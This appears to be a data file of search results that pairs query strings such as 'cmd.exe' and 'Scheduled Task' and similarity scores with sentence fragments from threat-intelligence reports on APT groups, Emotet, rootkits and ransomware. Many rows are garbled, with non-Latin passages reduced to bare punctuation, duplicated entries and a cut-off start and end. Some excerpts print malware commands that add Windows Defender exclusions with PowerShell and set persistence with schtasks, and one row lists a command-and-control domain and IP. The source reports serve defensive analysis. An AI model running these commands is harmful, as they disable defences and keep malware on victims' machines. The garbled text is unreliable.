Dropper using the http command.', 'Dropper will then install Client_RAT to the infected system as follows: RECON DROPPER LOADER CLIENT_RAT 1 2 3 DROPPER Recon decrypts LOADER Dropper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Dropper extracts decrypted Client_RAT Client_RAT Dropper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Dropper needs MD5 encryption key, which only the attacker knows.', 'Group-IB specialists have analyzed two versions of Dropper.', 'There are no fundamental differences between them: both versions were used to decrypt the loader and encrypted payload, as well as to ensure loader persistence in the system.']"
"""cmd.exe"|0.8005088309270048|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"""cmd.exe"|0.7784302417153919|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"""cmd.exe"|0.7610348906349725|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
"""cmd.exe"|1.0|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"""cmd.exe"|0.8089725984772371|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"""cmd.exe"|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
Scheduled Task/Job: Scheduled Task|0.9320278692311929|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
Scheduled Task/Job: Scheduled Task|0.8037358727264983|"['Analyze The recipients of the document 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Official Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts application (CVE-201711882) to decode the 8.t in memory, after fork to install two files: C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f and C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da The malware is a dll, it seems to be Gh0st RAT.', 'https://app.any.run/tasks/5715cfe3-2550-4808-aad0-1ea4c4fc7a88 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe call in the entry loads dynamically wsc.dll and call the function _run@4 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 1/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to connect to nicetiss54.lflink.com|185.216.35.11.', 'https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 2/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Intelligence Consideration We have the same TTps and victimology like Goblin Panda: Officials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdoor has changed.', 'Its used a scheduled task.', 'Usually this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha256 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha1 6e670a837970a1fb4161d77d5f720d318d7e4dbc md5 f34514118eb4689560cd6c0c654f26d9 Dropped executable file sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 3/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetiss54.lflink.com Connections ip 185.216.35.11 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 4/4']"
Scheduled Task/Job: Scheduled Task|0.793009151683534|"['The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as follows: 1.', 'The MagicString class provides a getter property, which decrypts strings on access.', '2.', 'The MagicString class has an encrypted string field.', '3.', 'The MagicString class provides __Decrypt, a wrapper method for decryption.', '4.', 'If it is StealthMutants first time to use the __Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) will be initialized based on the hard-coded __factory value, although this IV is meaningless in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
Scheduled Task/Job: Scheduled Task|0.7923100752989021|['Tactic ID Name Description Initial ScarCruft uses watering-hole attacks to T1189 Drive-by Compromise Access compromise victims.', 'Execution Command and Scripting Interpreter: T1059.006 The Dolphin loader a uses Python script.', 'Python 7/8Tactic ID Name Description Command and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.007 JavaScript watering-hole attack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T1106 Native API files and inject processes.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.005 Task start after installation.', 'Persistence Boot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.001 Registry Run Keys / Startup Folder loader.', 'Process Injection: Portable Defense T1055.002 Dolphin can inject into other processes.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.']
Scheduled Task/Job: Scheduled Task|0.7773024254359916|['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the following: 1.', 'On launch, the primary NoxPlayer executable Nox.exe will send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the appropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have been replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is installed on the victims machine.']
Scheduled Task/Job: Scheduled Task|0.7784461133552625|"['The attackers sent their victims archives containing malicious executable files whose names ended with PDF so that the victim would think it was a real document and open the file.', ""Figure 34 Phishing email Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 81 After the malicious file named paymentSlip.pdf.exe was run on the victim's computer, several files were saved to shared directories."", 'Then the attackers ran PowerShell and added these files to the MS Windows Defender exclusions list.', '""$windir\\\\$system32\\\\WindowsPowerShell\\\\v1.0\\\\PowerShell.exe"" Add-MpPreference -ExclusionPath ""$user\\\\$appdata\\\\aPCyDwLsApDgb.exe"" (MITRE: T1562.001 Impair Defenses: Disable or Modify Tools).', 'After that, they used the standard tool named schtasks.exe to create scheduled tasks, and one of the files previously dropped onto the computer served as the configuration file for these tasks.', '""$windir\\\\$system32\\\\schtasks.exe"" /Create /TN ""Updates\\\\aPCyDwLsApDgb"" /XML ""$user\\\\$temp\\\\tmp8ACB.tmp"" (MITRE: T1053.005 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 82 Example launch of malware in Kaspersky Sandbox: Figure 35 Illustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 83 Example 3 Another similar example of a phishing email.', 'The email contains two attached archives: Figure 36 Phishing email When 25th April_PDF.exe is run, it uses PowerShell to change the configuration of Windows Defender: ""$windir\\\\$system32\\\\WindowsPowerShell\\\\v1.0\\\\PowerShell.exe"" Add-MpPreference -ExclusionPath ""$selfpath\\\\$selfname.exe"" (MITRE: T1562.001 Impair Defenses: Disable or Modify Tools).', 'Then it creates a task in the scheduler to achieve persistence: ""$windir\\\\$system32\\\\schtasks.exe"" /Create /TN ""Updates\\\\htOTEVF"" /XML ""$user\\\\$temp\\\\tmp56EA.', 'tmp"" (MITRE: T1053.005 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 84 Figure 37 Illustration of an Execution Graph in TIP The 24th April_PDF.exe sample also adds itself to Windows Defender exclusions, then gathers account credentials from browsers: Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 85 Figure 38 Illustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Initial Access TA0001 | Phishing: Spearphishing Attachment T1566.001 Contents 86 Figure 39 Attack scenario Dropped EXE Start Exclude power malware shell Attachment Contains Masquerading extension PDF EXE Phishing RAR EXE email Dropped TMP Importing task Create scheduled task Detection The following approaches are used to detect phishing: Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scanning attachments in emails Analyzing web traffic and identifying suspicious websites that may be linked to phishing attacks by means of malware detection and monitoring systems Giving users the capability to report suspicious emails or websites that they believe are phishing.']"
Exploit Public-Facing Application|1.0|['1 MITRE.', '(October 11, 2019).', 'Drive-by Compromise.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1189/ 2 MITRE.', '(October 22, 2019).', 'Exploit Public-Facing Application.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1190/ 3 MITRE.', '(May 31, 2017).', 'External Remote Services.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1133/ TLP: WHITE, ID#202006091030 10TTPs Hardware Additions 1 Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access.', 'While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access.']
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder|0.7953454576738687|"['If we observe activity that cannot be attributed to a known entity, we refer to the threat actor as a dev set to facilitate further development and analysis, and in some cases we will assign a named set to a dev set if our analysis results in an attribution assessment.', 'Where we see overlaps in attribution between our research and other organisations, we provide the respective threat actor names.', 'Key terms and phrases concerning threat actors Cyber criminal -as-a-Service offerings: Cyber criminal services which are developed and then advertised for use in exchange for payment, such as the following included in this report: Access-as-a-Service (AaaS): The criminal service offering which charges customers for accesses to networks, predominantly corporate.', 'This type of offering can be divided into the following two categories: Initial access broker (IAB): A cyber criminal who sells login credentials to exposed Internet-facing infrastructure, such as remote desktop protocol (RDP) and virtual private networks (VPNs), to customers.', 'Malware delivery system: A criminal service which uploads a customers malware onto a compromised host as a secondary payload, such as White Taranis via Emotet and White Horoja via Qakbot.', '- pg.', '45-48 Distributed Denial of Service-for-hire (DDoS-for-hire): The criminal service offering where cyber criminals pay a fee to an illicit capability to conduct DDoS attacks, such as Blue Kurama (a.k.a.', 'Killnet) which started as a DDoS-for-hire capability.', '- pg.', '19 72 | Cyber Threats 2022: A Year in Retrospect Phishing-as-a-Service (PHaaS): The criminal service offering where cyber criminals pay a fee to an illicit phishing capability to send phishing emails, such as EvilProxy, Caffeine and Robin Banks toolkits.', '- pg.']"
Valid Accounts: Default Accounts|0.7718627731694163|['Do they see that the top 60 most targeted victims in our dataset evolveintimeandifso,howquicklydotheyadapt receivedmaliciousemailsoftenoverthelastfouryears.', 'tonewdefensemechanisms?', '(We note that the dataset shared by one of our volun- teersstartsonAugust2012,explainingwhyweobserve (cid:15) What is the efficacy of existing countermeasures?', 'moremaliciousemailsafterthatdate.)', 'Wealsoseethat, As all malicious documents in our dataset used 31emailaccountsfromindividualswithoutaffiliationto well-known vulnerabilities, would commercial, WUC were often targeted simultaneously to the WUC state-of-the-artdefenseshavedetectedallofthem?', 'accounts.', '7Targeted vulnerabilities 60 50 40 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Targeted applications 60 Unknown Others 50 20062492 20093129 20103333 40 20120158 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Office Acrobat Figure8: Numberofmaliciousdocumentscontainingagivenvulnerability(CVE)(left)andtargetapplication(right) for each month of our dataset.', 'We represent the top four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate.', 'The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader.', 'Although Acrobat Reader was the most targeted application until 2010, recent attacksmainlytargettheOfficesuite.', '4.1 Methodology our taint-assisted manual analysis are described in Ap- pendixB.']
Valid Accounts: Default Accounts|0.7718627731694163|['Figure1: E-mailcontainingFinSpy.', '4.1 Bahrain 3 DataOverviewandImplications We have analyzed two attack campaigns in the context of Ourstudyisbasedonextensiveanalysisofmaliciousfilesand Bahrain,wherethegovernmenthasbeenpursuingacrackdown suspect communications relevant to the activities of targeted againstanArab-Springinspireduprisingsince2/14/2011.', 'groupsinBahrain,Syria,andtheUAE,asdocumentedinTa- The first involved malicious e-mails containing FinSpy, a ble1.Anumberoftheattackshadsignificantreal-worldimpli- lawfulintercepttrojansoldexclusivelytogovernments.', 'The cations,perTable2.', 'Inmanycases,wekeepourdescriptions secondinvolvedspeciallycraftedIPspylinksande-mailsde- somewhatimprecisetoavoidpotentialleakageoftargetidenti- signedtorevealtheIPaddressesofoperatorsofpseudonymous ties.', 'accounts.', 'Some individuals who apparently clicked on these We began our work when contacted by individuals con- links were later arrested, including Ali (cf.', '1), whose click cernedthatagovernmentmighthavetargetedthemforcyber- appears to have been used against him in court.', 'While both attacks.Aswebecamemoreacquaintedwiththetargetedcom- campaigns point back to the government, we have not as yet munities,insomecaseswecontactedtargetedgroupsdirectly; identified overlap between the campaigns; targets of FinSpy inothers,wereachedouttoindividualswithconnectionstotar- appearedtoresidemainlyoutsideBahrain,whereastheIPspy getedgroups,whoallowedustoexaminetheircommunications links targeted those mainly inside the country.', 'We examine withthegroups.ForBahrainandSyria,theworkencompassed eachcampaigninturn.', '10,000sofe-mailsandinstantmessages.FortheUAE,thevol- umeisseveralthousandcommunications.']
Valid Accounts: Default Accounts|0.7718627731694163|['Do they see that the top 60 most targeted victims in our dataset evolveintimeandifso,howquicklydotheyadapt receivedmaliciousemailsoftenoverthelastfouryears.', 'tonewdefensemechanisms?', '(We note that the dataset shared by one of our volun- teersstartsonAugust2012,explainingwhyweobserve What is the efficacy of existing countermeasures?', 'moremaliciousemailsafterthatdate.)', 'Wealsoseethat, As all malicious documents in our dataset used 31emailaccountsfromindividualswithoutaffiliationto well-known vulnerabilities, would commercial, WUC were often targeted simultaneously to the WUC state-of-the-artdefenseshavedetectedallofthem?', 'accounts.', '7 USENIX Association 23rd USENIX Security Symposium 549Targeted vulnerabilities 60 50 40 30 20 10 0 200909 201009 201109 201209 201309 Time 550 23rd USENIX Security Symposium USENIX Association stnemucod suoicilam fo rebmuN Targeted applications 60 Unknown Others 50 20062492 20093129 40 20103333 20120158 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Office Acrobat Figure8: Numberofmaliciousdocumentscontainingagivenvulnerability(CVE)(left)andtargetapplication(right) for each month of our dataset.', 'We represent the top four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate.', 'The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader.', 'Although Acrobat Reader was the most targeted application until 2010, recent attacksmainlytargettheOfficesuite.', '4.1 Methodology our taint-assisted manual analysis are described in Ap- pendixB.']
Valid Accounts: Default Accounts|0.7718627731694163|['Often, the request comes with a sob story or other emotion intended to manipulate the help desk worker.', 'This attack only takes a few minutes.', 'Muddled Libra is unusually comfortable with engaging over the telephone, with both help desk and other employees.', 'They are more successful in persuading people to engage in unsafe actions as a result.', 'Often, they will acquire initial access by taking over a less-privileged legitimate user account.', 'Then, they identify the more highly privileged accounts that will help them achieve their objectives and call back to take over those accounts.', 'In one case that Unit 42 worked, the attackers successfully hoodwinked the help desk three separate times.', 'Muddled Libra also buys stolen credentials from initial access brokers.', 'The threat group has been very open about their desire to buy access to certain targets, especially in the segments they have chosen.', '10Spotlight On: Muddled Libra Incident Response Report 2024 And if these social engineering access methods Why Is It So Hard to Eject This dont work, Muddled Libra also has technical Threat Actor?', 'tactics to use as well.']
Valid Accounts: Default Accounts|0.7718627731694163|"['Convenience (1%) and Ideology (1%).', 'Whereas Financial attacksif not detected while occurring or soon thereaftereventually become apparent when money goes missing.', 'At that point, the Financial motive, if not already ascertained, can be determined.', '100% 80% Financial 60% 40% Espionage 20% 0% 2014 2015 2016 2017 2018 2019 2020 (n=1,141) (n=1,208) (n=1,419) (n=1,552) (n=2,089) (n=1,320) (n=1,134) Figure #36: Actor motives over time within all breaches (2014-2020 DBIR) 0% 20% 40% 60% 80% 100% 0% 20% 40% 60% 80% 100% Financial Financial 86% 76% Espionage Espionage 10% 18% Grudge Fun 2% 3% Fun Grudge 1% 1% Convenience Convenience 1% 1% Ideology Ideology 1% 1% Figure #37: Actor motives within all breaches Figure #38: Actor motives within all breaches (2020 DBIR; n=1,141) (2014-2020 DBIR; n=9,863) 24 2020-2021 Cyber-Espionage ReportProactive defense: The best defense is a great offense.', 'Threat hunting | Additional actions Behavioral analysis Consider taking these additional Advanced threat actors attempt protective measures: to blend in to evade automated cyberdefense measures.', 'With the rise Assign all users separate, unique of zero-day and fileless attacks, its accounts.', 'Dont use generic or harder than ever to protect endpoints shared accounts or passwords with confidence.', 'In addition, preventing Block outbound, unrestricted internet and detecting these attacks can be a access from server infrastructure.', 'huge drain on organizational resources.', 'This is intended to prevent adversaries from exfiltrating data to Compromise happens within minutes known or unknown IP addresses and to hours, as we have seen consistently using services, protocols or ports in over the years in the DBIR.', 'This is mainly an unauthorized manner attributable to the use of email and web-based threat vectors coupled with Create adequate network heavily automated attacks (nowadays segmentation to separate virtual local also powered by machine learning).']"
Exploitation for Privilege Escalation|0.8325099363761475|['Just two years ago, the median time between compromise and exfiltration was nine days.', 'By 2023, it was two daysa full week less.', 'Especially striking is how often attackers move quickly.', 'In almost 45% of our cases this year, attackers exfiltrated data in less than a day after compromise.', 'This means that almost half the time, organizations must respond within hours to stop them.', '33Spotlight On: Speed Incident Response Report 2024 Casefile: Black Basta Ransomware How many minutes it can take for an attacker... Phishing email starts the clock Initial entry starts: +30 minutes after phishing email Reconnaissance starts: +15 minutes after initial entry (45 minutes elapsed) Privilege escalation and C2 starts: +45 minutes after recon (90 minutes elapsed) Exfiltration starts: +390 minutes after priv esc/C2 (8 hours elapsed) Account modification starts: +80 minutes after exfil (9 hours and 20 minutes elapsed) Ransomware prep starts: +130 minutes after account mod (11 hours and 30 minutes elapsed) Ransomware deployment starts: +125 minutes after prep starts (13 hours and 35 minutes elapsed) Figure 7.', 'In less than 14 hours, attackers gained access to an organization, exfiltrated terabytes of data, and deployed ransomware to nearly 10,000 endpoints.', 'In certain kinds of cases, exfiltration happens In one case involving Black Basta ransomware, it even faster.', 'While we expected that extortion took attackers less than 14 hours to accomplish cases would be the fastest to exfiltration, that extensive compromise.', 'Starting with a simple wasnt the case.', 'In matters that dont involve phishing email, the threat group gained initial extortion, attackers are working within hours more entry to the organization a mere half hour later.']
exploiting vulnerabilities in the remote desktop protocol (RDP).|0.7531379604541858|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
“cmd /c|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
“cmd /c|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
“cmd /c|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
“cmd /c|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
“cmd /c|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
Malware Obfuscation|0.8857161809887081|['ESET Research White papers // July 2019 MACHETE JUST GOT SHARPER Venezuelan military under attack How spies managed to steal gigabytes of confidential data over the course of a yearTABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']
"malware
also checks that the operating system version"|0.775010192611511|['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'All four driver samples are digitally signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 433CCR Company (433 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', 'Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'https://www.fortinet.com/blog/threat-research/deep-panda-log4shell-fire-chili-rootkits 5/164/27/22, 3:49 PM New Milestones for Deep Panda: Log4Shell and Digitally Signed Fire Chili Rootkits Figure 9: Detection rates of the rootkit samples from VirusTotal The rootkit starts by ensuring the victim machine is not running in safe mode.', 'It then checks the operating system version.', 'The rootkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest supported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, processes, registry keys and network connections.']
"malware
also checks that the operating system version"|0.775010192611511|['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'All four driver samples are digitally signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 433CCR Company (433 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', '5/14Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'Figure 9: Detection rates of the rootkit samples from VirusTotal 6/14The rootkit starts by ensuring the victim machine is not running in safe mode.', 'It then checks the operating system version.', 'The rootkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest supported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, processes, registry keys and network connections.']
"The injection
